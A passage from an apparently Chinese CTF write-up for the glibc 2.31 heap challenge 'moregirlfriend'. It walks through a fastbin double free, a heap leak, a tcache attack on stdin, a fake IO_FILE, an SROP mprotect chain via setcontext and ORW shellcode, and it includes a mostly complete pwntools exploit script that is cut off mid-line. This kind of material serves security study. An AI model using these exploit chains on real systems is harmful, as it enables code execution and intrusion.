punctuation">)</span> <span class="token comment"># init bins</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="3-构造UAF-amp-leak-heap"><a href="#3-构造UAF-amp-leak-heap" class="headerlink" title="3.构造UAF&amp;leak heap"></a>3.构造UAF&amp;leak heap</h4><p>由于Tcache对double free的检查更为严格,这里我们选择先打出fastbin的double free同时泄露heap</p><p>故需要先把相应大小的tcache bins填满.</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">7</span><span class="token operator">+</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token comment">#chunk[0-12]</span>  add<span class="token punctuation">(</span>i<span class="token punctuation">,</span><span class="token number">0x68</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">0x20</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>之后为了能够泄露heap地址,原理同leak libc,且只有NUM==8的时候能够产生double free</p><p>所以先释放2个chunk</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">delete<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token comment"># Full tcache</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这样就会再tcachebins中填充2个chunk</p><p>之后再释放NUM==8 的9个chunks,构造double free的同时leak heap</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">delete<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">9</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token comment"># double free chunk[0]</span><span class="token comment"># 2+8+1 = 11chunks = 7tcaches + 3fatsbins(loss chunk[8])</span><span class="token comment"># fastbins: chunk[0]->chunk[9]->chunk[0]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>double free之前:</p><blockquote><p>Tcachebins:[7]-&gt;[6]-&gt;[5]-&gt;[4]-&gt;[3]-&gt;[2]-&gt;[1]</p><p>Fastbins:[9]-&gt;[0]-&gt;[8]</p></blockquote><p>再doublefree之中:</p><blockquote><p>先printf(“%s”,chunk[0]) ==&gt; 打印chunk[0]的fd( chunk[8]的地址 ) ==&gt; 泄露heap地址</p><p>再free(chunk[0]) ==&gt; 完成doublefree,同时覆盖原来chunk[0]的fd由chunk[8]改为chunk[9]</p></blockquote><p>doublefree之后:</p><blockquote><p>Tcachebins:[7]-&gt;[6]-&gt;[5]-&gt;[4]-&gt;[3]-&gt;[2]-&gt;[1]</p><p>Fastbins:[0]-&gt;[9]-&gt;[0]</p></blockquote><p>这样再第二次释放chunk[0]的时候,就可以泄露heap地址</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"9 has left you."</span><span class="token punctuation">)</span>heap <span class="token operator">=</span> u64<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'\x55'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">>></span> <span class="token number">8</span> <span class="token comment"># 出去结尾'0x0a'</span>heap_base <span class="token operator">=</span> heap <span class="token operator">&amp;</span> <span class="token number">0xfffffffff000</span>log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">"heap_base ==> "</span><span class="token operator">+</span><span class="token builtin">hex</span><span class="token punctuation">(</span>heap_base<span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h4 id="4-构造TcacheAttack"><a href="#4-构造TcacheAttack" class="headerlink" title="4.构造TcacheAttack"></a>4.构造TcacheAttack</h4><p>利用FastbinAttack在堆上打出一个size比较大的Tcache doublefree</p><p>首先在一个合适的位置写入0x291 ( 0x60+0x70*5 ) 的fake size,顺便清空tcache</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token comment"># empty tcache</span>  <span class="token keyword">if</span> i <span class="token operator">==</span> <span class="token number">6</span><span class="token punctuation">:</span> <span class="token comment"># fake size</span>    add<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">0x68</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x291</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment"># 0x290 = 0x60+0x70*5</span>  <span class="token keyword">else</span><span class="token punctuation">:</span>    add<span class="token punctuation">(</span>i<span class="token punctuation">,</span><span class="token number">0x68</span><span class="token punctuation">,</span><span class="token string">"="</span><span class="token operator">*</span><span class="token number">0x20</span><span class="token operator">+</span><span class="token string">"=["</span><span class="token operator">+</span><span class="token builtin">str</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">"]="</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这里就存在一个</p><pre class="line-numbers language-none"><code class="language-none">chunk[6] --&gt; 0x00000000 0x00000071 (alloc)             0x00000000 0x00000291             0x00000000 0x00000000<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>之后通过原来的fastbin doublefree,构造这个chunk的堆重叠(通过之前获得的heap_base地址)</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">add<span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token number">0x68</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span>heap_base<span class="token operator">+</span><span class="token number">0x320</span><span class="token punctuation">)</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">11</span><span class="token punctuation">,</span><span class="token number">0x68</span><span class="token punctuation">,</span><span class="token string">"11"</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">12</span><span class="token punctuation">,</span><span class="token number">0x68</span><span class="token punctuation">,</span><span class="token string">'12'</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">13</span><span class="token punctuation">,</span><span class="token number">0x68</span><span class="token punctuation">,</span><span class="token string">'13'</span><span class="token punctuation">)</span> <span class="token comment"># tcache don't check chunk_size</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>得到效果</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">chunk<span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">]</span> <span class="token operator">-</span><span class="token operator">-</span><span class="token operator">></span> <span class="token number">0x00000000</span> <span class="token number">0x00000071</span> <span class="token punctuation">(</span>alloc<span class="token punctuation">)</span>chunk<span class="token punctuation">[</span><span class="token number">13</span><span class="token punctuation">]</span><span class="token operator">-</span><span class="token operator">-</span><span class="token operator">></span> <span class="token number">0x00000000</span> <span class="token number">0x00000291</span>             <span class="token number">0x00000000</span> <span class="token number">0x00000000</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>之后再malloc(0x280)的chunk并释放配合得到unsortedbin链</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">add<span class="token punctuation">(</span><span class="token number">14</span><span class="token punctuation">,</span><span class="token number">0x280</span><span class="token punctuation">,</span><span class="token string">"14"</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>之后再释放chunk[13],得到unsortedbins: chunk[13] -&gt; chunk[14]</p><p>之后释放chunk[6]再申请回来修改fd,指向stdin,得到stdin任意写</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">delete<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token punctuation">[</span><span class="token number">14</span><span class="token punctuation">,</span><span class="token number">13</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">]</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">0x68</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x291</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>stdin<span class="token punctuation">)</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">12</span><span class="token punctuation">,</span><span class="token number">0x288</span><span class="token punctuation">,</span><span class="token string">'12'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>得到TcacheBins :  _IO_2_1_stdin_ </p><h4 id="5-构造fake-IO等"><a href="#5-构造fake-IO等" class="headerlink" title="5.构造fake IO等"></a>5.构造fake IO等</h4><p>由于在搞glibc版本中<code>setcontext+53</code>的寄存器调整为rdx而不是原来的rdi,这里就需伪造_IO_2_1_stdout_的_chian指向的IO_file来得到更好的调用链,具体如下:</p><p>首先修改stdin的结构体,主要就是修改flag位为0xfbad1800,修改_IO_write_ptr到stdin+0xe0,修改vtable到_IO_str_jumps,</p><p>具体如下:</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">add<span class="token punctuation">(</span><span class="token number">12</span><span class="token punctuation">,</span><span class="token number">0x288</span><span class="token punctuation">,</span><span class="token string">'12'</span><span class="token punctuation">)</span><span class="token comment"># IO_file Struct size = 0xe0</span>fake_io <span class="token operator">=</span> p64<span class="token punctuation">(</span><span class="token number">0xfbad1800</span><span class="token punctuation">)</span> <span class="token comment">#flag</span>fake_io <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token comment">#_IO_read_ptr</span>fake_io <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token comment">#_IO_read_end</span>fake_io <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token comment">#_IO_read_base</span>fake_io <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token comment">#_IO_write_base</span>fake_io <span class="token operator">+=</span> p64<span class="token punctuation">(</span>stdin<span class="token operator">+</span><span class="token number">0xe0</span><span class="token punctuation">)</span> <span class="token comment">#_IO_write_ptr (setcontext的参数rdx,使其指向 srop_mprotect)</span>fake_io <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token comment">#_IO_write_end</span>fake_io <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token comment">#_IO_buf_base</span>fake_io <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token comment">#_IO_buf_end</span>fake_io <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token comment">#_IO_save_base</span>fake_io <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token comment">#_IO_backup_base</span>fake_io <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token comment">#_IO_save_end</span>fake_io <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token comment">#_markers </span>fake_io <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token comment">#_chain </span>fake_io <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token comment">#_fileno </span>fake_io <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token comment">#_flags2</span>fake_io <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token comment">#_old_offset</span>fake_io <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token comment">#_cur_column </span>fake_io <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token comment">#_vtable_offset</span>fake_io <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token comment">#_shortbuf</span>fake_io <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token comment">#_lock</span>fake_io <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token comment">#_offset</span>fake_io <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token comment">#_codecvt</span>fake_io <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token comment">#_wide_data</span>fake_io <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token comment">#_freeres_list</span>fake_io <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token comment">#_freeres_buf</span>fake_io <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token comment">#__pad5</span>fake_io <span class="token operator">+=</span> p64<span class="token punctuation">(</span>vtable<span class="token punctuation">)</span> <span class="token comment">#vtable -> _IO_str_jumps</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>其中我们注意到,我们修改了_IO_write_ptr位为p64(stdin+0xe0),首先这个stdin的IO_file结构体大小就是0xe0,这里是把这个指针指向该结构体下面我们另外一块可以控制的地方.</p><p><img src="https://pic.imgdb.cn/item/617bc01f2ab3f51d910d5b6c.png"></p><p>既stdin+0xE0就是_IO_wide_data_0处的地址,这里我们依然可以任意写,之后的malloc_hook我们依然可以任意写</p><p>填充完stdin之后就是填充stdin+0xE0,这里我们填充为SROP的mprotect部分</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">srop_mprotect <span class="token operator">=</span> SigreturnFrame<span class="token punctuation">(</span><span class="token punctuation">)</span>srop_mprotect<span class="token punctuation">.</span>rsp <span class="token operator">=</span> malloc_hook <span class="token operator">+</span> <span class="token number">0x8</span>srop_mprotect<span class="token punctuation">.</span>rdi <span class="token operator">=</span> malloc_hook_basesrop_mprotect<span class="token punctuation">.</span>rsi <span class="token operator">=</span> <span class="token number">0x1000</span>srop_mprotect<span class="token punctuation">.</span>rdx <span class="token operator">=</span> <span class="token number">7</span>srop_mprotect<span class="token punctuation">.</span>rip <span class="token operator">=</span> libc_base <span class="token operator">+</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'mprotect'</span><span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>之后再覆盖malloc_hook为<code>setcontext+61</code>调整寄存器,并调用sysread</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># read shellcode</span>mpro <span class="token operator">=</span> <span class="token triple-quoted-string string">'''xor rdi,rdimov rsi,%dmov rdx,0x1000xor rax,raxsyscalljmp rsi'''</span><span class="token operator">%</span>malloc_hook_basepayload <span class="token operator">=</span> fake_io<span class="token operator">+</span><span class="token builtin">str</span><span class="token punctuation">(</span>srop_mprotect<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">3</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>setcontext <span class="token operator">+</span> <span class="token number">61</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>malloc_hook<span class="token operator">+</span><span class="token number">0x10</span><span class="token punctuation">)</span><span class="token operator">+</span>asm<span class="token punctuation">(</span>mpro<span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">14</span><span class="token punctuation">,</span><span class="token number">0x288</span><span class="token punctuation">,</span>payload<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="6-getshell"><a href="#6-getshell" class="headerlink" title="6.getshell"></a>6.getshell</h4><p>之后只要触发exit(0),就可以从malloc_hook开启调用链,并发送ORW的shellcode就可以得到flag</p><p><code>exit(0) ==&gt; __run_exit_handlers ==&gt; _IO_cleanup ==&gt; _IO_flush_all_lockp ==&gt; IO_file_overflow  ==&gt; malloc ==&gt; __molloc_hook ==&gt; setcontext+61 ==&gt; mprotect ==&gt; shellcode1(SYS_read) ==&gt; shellcode2(ORW)</code></p><pre class="line-numbers language-python" data-language="python"><code class="language-python">choice<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"you?\n"</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token comment">#执行exit(0),Begin ORW</span>shellcode <span class="token operator">=</span> shellcraft<span class="token punctuation">.</span>amd64<span class="token punctuation">.</span><span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"flag"</span><span class="token punctuation">)</span>shellcode <span class="token operator">+=</span> shellcraft<span class="token punctuation">.</span>amd64<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span>malloc_hook_base<span class="token punctuation">,</span><span class="token number">0x20</span><span class="token punctuation">)</span>shellcode <span class="token operator">+=</span> shellcraft<span class="token punctuation">.</span>amd64<span class="token punctuation">.</span>write<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>malloc_hook_base<span class="token punctuation">,</span><span class="token number">0x20</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>asm<span class="token punctuation">(</span>shellcode<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># gdb.attach(p)</span>p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="完整exp"><a href="#完整exp" class="headerlink" title="完整exp"></a>完整exp</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># -*- coding: UTF-8 -*-</span><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>context<span class="token punctuation">(</span>os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">)</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"./moregirlfriend"</span><span class="token punctuation">)</span>libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./libc-2.31.so'</span><span class="token punctuation">)</span><span class="token comment"># libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")</span>loacl <span class="token operator">=</span> <span class="token number">1</span>context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span><span class="token keyword">if</span> loacl<span class="token punctuation">:</span>  p <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"./moregirlfriend"</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>  p <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">"node4.buuoj.cn"</span><span class="token punctuation">,</span><span class="token string">"29242"</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">choice</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">:</span>  p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"wow:"</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">add</span><span class="token punctuation">(</span>idx<span class="token punctuation">,</span>size<span class="token punctuation">,</span>data<span class="token punctuation">)</span><span class="token punctuation">:</span>  choice<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>  p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"more one?"</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">)</span>  p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"Height?"</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span>  p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"girlfriend?"</span><span class="token punctuation">,</span>data<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">free</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>  choice<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">delete</span><span class="token punctuation">(</span>num<span class="token punctuation">,</span>idx<span class="token operator">=</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">:</span>  choice<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>  p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"leave you?"</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span>num<span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>num<span class="token punctuation">)</span><span class="token punctuation">:</span>    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">"Which girlfriend?"</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span>idx<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  free<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment"># ========[leak libc]===========</span>add<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0x450</span><span class="token punctuation">,</span><span class="token string">"0"</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0x450</span><span class="token punctuation">,</span><span class="token string">"1"</span><span class="token punctuation">)</span> <span class="token comment"># leave top chunk</span>delete<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0x450</span><span class="token punctuation">,</span><span class="token string">"0"</span><span class="token operator">*</span><span class="token number">8</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token comment"># leak libc (unsortedbin bk)</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"0"</span><span class="token operator">*</span><span class="token number">8</span><span class="token punctuation">)</span>addr <span class="token operator">=</span> u64<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'\x7f'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>libc_base <span class="token operator">=</span> addr<span class="token operator">-</span>libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'__malloc_hook'</span><span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token number">0x10</span> <span class="token operator">-</span> <span class="token number">96</span>log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">"libc_base ==> "</span><span class="token operator">+</span><span class="token builtin">hex</span><span class="token punctuation">(</span>libc_base<span class="token punctuation">)</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token comment"># init bins</span><span class="token comment"># =========[UAF &amp; leak heap]=========</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">11</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token comment"># chunk[0-10]</span>    add<span class="token punctuation">(</span>i<span class="token punctuation">,</span><span class="token number">0x68</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">3</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token comment"># Full tcache</span>delete<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">7</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">9</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token comment"># double free chunk[0]</span><span class="token comment"># 2+8+1 = 11chunks = 7tcaches + 3fatsbins(loss chunk[8])</span><span class="token comment"># fastbins: chunk[0]->chunk[9]->chunk[0]</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"9 has left you."</span><span class="token punctuation">)</span>heap <span class="token operator">=</span> u64<span class="token punctuation">(</span>p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'\x55'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">>></span> <span class="token number">8</span>heap_base <span class="token operator">=</span> heap <span class="token operator">&amp;</span> <span class="token number">0xfffffffff000</span>log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">"heap_base ==> "</span><span class="token operator">+</span><span class="token builtin">hex</span><span class="token punctuation">(</span>heap_base<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># =========[get real addr]===========</span>malloc_hook <span class="token operator">=</span> libc_base<span class="token operator">+</span>libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'__malloc_hook'</span><span class="token punctuation">]</span>malloc_hook_base <span class="token operator">=</span> malloc_hook <span class="token operator">&amp;</span> <span class="token number">0xFFFFFFFFF000</span>setcontext <span class="token operator">=</span> libc_base<span class="token operator">+</span>libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'setcontext'</span><span class="token punctuation">]</span>mprotect <span class="token operator">=</span> libc_base<span class="token operator">+</span>libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'mprotect'</span><span class="token punctuation">]</span>stdin <span class="token operator">=</span> libc_base<span class="token operator">+</span>libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'_IO_2_1_stdin_'</span><span class="token punctuation">]</span>vtable <span class="token operator">=</span> libc_base<span class="token operator">+</span><span class="token number">0x1ED560</span> <span class="token comment"># _IO_str_jumps</span><span class="token comment"># =========[Tcache Attack]===========</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token comment"># empty tcache</span>  <span class="token keyword">if</span> i <span class="token operator">==</span> <span class="token number">6</span><span class="token punctuation">:</span> <span class="token comment"># fake size</span>    add<span class="token punctuation">(</span><span class="token number">6</span><span 